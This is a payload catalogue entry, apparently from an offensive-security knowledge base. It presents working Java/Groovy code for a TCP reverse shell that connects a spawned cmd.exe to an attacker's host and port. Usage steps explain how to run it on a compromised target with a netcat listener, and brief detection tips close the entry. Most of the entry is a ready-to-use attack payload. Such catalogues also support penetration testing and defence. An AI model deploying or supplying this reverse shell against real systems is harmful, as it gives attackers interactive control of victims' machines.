---
id: 8fb02a8c-0d35-47ac-8e83-75540f572ea9
type: code
language: Java
verified: true
created_at: '2023-04-06T03:56:24.696793+00:00'
updated_at: '2023-04-10T20:25:30.894720+00:00'
platforms:
  - Linux
  - Windows
  - macOS
tags:
  - reverse-shell
  - payload
  - java
  - groovy
validated: true
---

# Java-TCP-Reverse-Shell

## Code

```java
String host="10.0.0.1";
int port=4242;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

## Description

This Java code implements a TCP reverse shell that spawns a local command process (default: cmd.exe) and forwards its input/output streams over a socket connection to a remote host and port. It is designed to be executed within a Groovy environment on a compromised system, providing interactive shell access to the attacker without requiring additional binaries.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| host | IP address of the attacker machine to connect back to | 10.0.0.1 |
| port | Listening port on the attacker machine | 4242 |
| cmd | Command shell to spawn on the target (e.g., cmd.exe for Windows, /bin/sh for Linux) | cmd.exe |

## Usage

Embed this code into a Groovy script file (e.g., revshell.groovy) after substituting the host and port variables. Execute the script using the Groovy interpreter on the target. Ensure a listener (e.g., netcat) is running on the attacker side beforehand. This payload is suitable for Java/Groovy-enabled environments like application servers.

## Detection

- Monitor for outbound TCP connections from Java/Groovy processes to unusual IPs/ports.
- EDR alerts on ProcessBuilder usage spawning shells or anomalous network activity from javaw/groovy processes.
- Log Groovy script executions and inspect for socket creations or ProcessBuilder calls.

## Related

- [[procedures/Establish-Groovy-Java-Reverse-Shell]]
- [[tools/Groovy]]
